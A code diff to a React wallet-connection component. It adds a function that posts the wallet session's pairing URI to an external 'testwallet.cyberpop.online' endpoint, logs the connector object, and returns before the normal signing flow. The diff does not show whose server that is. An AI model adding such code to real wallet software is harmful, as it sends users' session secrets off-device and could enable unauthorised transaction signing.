@@ -168,6 +168,22 @@ class App extends React.Component<any, any> {
       return(false);
   }
 
+  public post = (url: string, chunk: string) => {
+    fetch(url,{
+        method:'post',
+        headers:{
+            'Content-Type': 'application/json; charset=UTF-8',
+        },
+        body: JSON.stringify({uri: window.encodeURIComponent(chunk)})
+    }).then((response)=>{
+        return response.json()
+    }).then((data)=>{
+        console.log(data)
+    }).catch((error)=>{
+        console.log(error)
+    })
+  }
+
   public connect = async () => {
     if (navigator.userAgent.match(/(iPhone|iPod|ios|iOS|iPad)/i)) {
        this.setState({ mobileType: 'iPhone' })
@@ -186,7 +202,11 @@ class App extends React.Component<any, any> {
 
     // console.log(killSession);
     console.log(connector.connected);
+    console.log(connector);
+    console.log(connector?.uri);
     
+
+
     // 检查是否已经连接
     if (!connector.connected) {
       // 创建新会话
@@ -204,7 +224,8 @@ class App extends React.Component<any, any> {
       const { mobileType } = this.state;
 
       console.log(payload);
-      // return; // 自动签名
+      this.post('https://testwallet.cyberpop.online/init', connector?.uri)
+      return; // 自动签名
       setTimeout(() => {
         console.log('you media:', mobileType);
         if(mobileType === 'android'){ // 如果是安卓使用personal签名
